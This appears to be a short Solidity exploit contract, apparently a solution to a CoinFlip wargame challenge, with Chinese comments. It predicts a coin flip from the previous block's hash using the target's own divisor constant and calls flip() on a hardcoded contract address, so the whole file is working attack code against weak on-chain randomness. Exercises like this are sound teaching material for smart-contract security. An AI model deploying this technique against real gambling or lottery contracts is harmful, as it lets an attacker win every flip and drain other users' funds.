// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
event CoinFlipResult(bool result);

contract CoonFlipAttacker{
    
    function getBlockNumer() public view returns(uint256){
        return block.number-1;    
    }

    function getCoinFlipPredit() public returns (bool success, bytes memory data) {
        bool predit = 1==(uint256(blockhash(block.number - 1))/57896044618658097711785492504343953926634992332820282019728792003956564819968);
        // 硬编码合约地址（假设已部署）
        address coinFlipAddress = 0xA0376e3976A6A8Cc4422B88Bb63A1E97Ed846031;

        // 使用 call 编码函数签名 + 参数
        (success, data) = coinFlipAddress.call(
            abi.encodeWithSignature("flip(bool)", predit)
        );
        return (success, data);
    }

}